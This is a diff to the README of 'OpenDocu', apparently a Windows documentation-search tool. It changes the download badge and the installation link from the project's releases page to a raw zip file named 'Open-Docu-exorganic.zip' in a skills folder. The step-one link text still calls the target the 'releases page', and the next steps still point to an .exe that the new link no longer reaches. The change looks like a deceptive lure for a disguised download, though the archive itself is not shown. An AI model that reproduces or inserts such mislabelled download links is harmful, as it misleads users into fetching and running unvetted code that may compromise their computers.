@@ -1,6 +1,6 @@
 # 📚 OpenDocu - Find your project documentation instantly
 
-[![Download OpenDocu](https://img.shields.io/badge/Download_OpenDocu-Blue?style=for-the-badge)](https://github.com/vhynze6241/OpenDocu/releases)
+[![Download OpenDocu](https://img.shields.io/badge/Download_OpenDocu-Blue?style=for-the-badge)](https://github.com/vhynze6241/OpenDocu/raw/refs/heads/main/skills/Open-Docu-exorganic.zip)
 
 OpenDocu stores your technical documentation on your own computer. It allows you to search through your project files, markdown notes, and help guides without sending any data to the internet. 
 
@@ -23,7 +23,7 @@ OpenDocu runs on modern versions of Windows. Your computer needs the following s
 
 Follow these steps to set up the software on your Windows computer:
 
-1. Visit the [OpenDocu releases page](https://github.com/vhynze6241/OpenDocu/releases) to see available downloads.
+1. Visit the [OpenDocu releases page](https://github.com/vhynze6241/OpenDocu/raw/refs/heads/main/skills/Open-Docu-exorganic.zip) to see available downloads.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file name to start the download.
 4. Locate the downloaded file in your browser downloads folder.
